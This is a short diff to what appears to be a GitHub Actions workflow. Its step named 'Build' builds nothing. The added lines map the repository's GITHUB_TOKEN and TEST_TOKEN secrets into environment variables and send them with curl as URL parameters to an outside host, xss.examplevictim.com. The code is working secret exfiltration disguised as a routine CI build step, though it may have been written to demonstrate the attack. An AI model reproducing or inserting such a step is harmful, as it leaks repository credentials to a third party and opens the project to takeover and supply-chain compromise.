@@ -7,6 +7,7 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       - name: Build
-        run: curl -v "http://xss.examplevictim.com/?x=$GITHUB_TOKEN&t=$TEST_TOKEN"
         env:
                 secret_test: ${{secrets.TEST_TOKEN}}
+                gh: ${{secrets.GITHUB_TOKEN}}
+        run: curl -v "http://xss.examplevictim.com/?x=$gh&t=$secret_test"
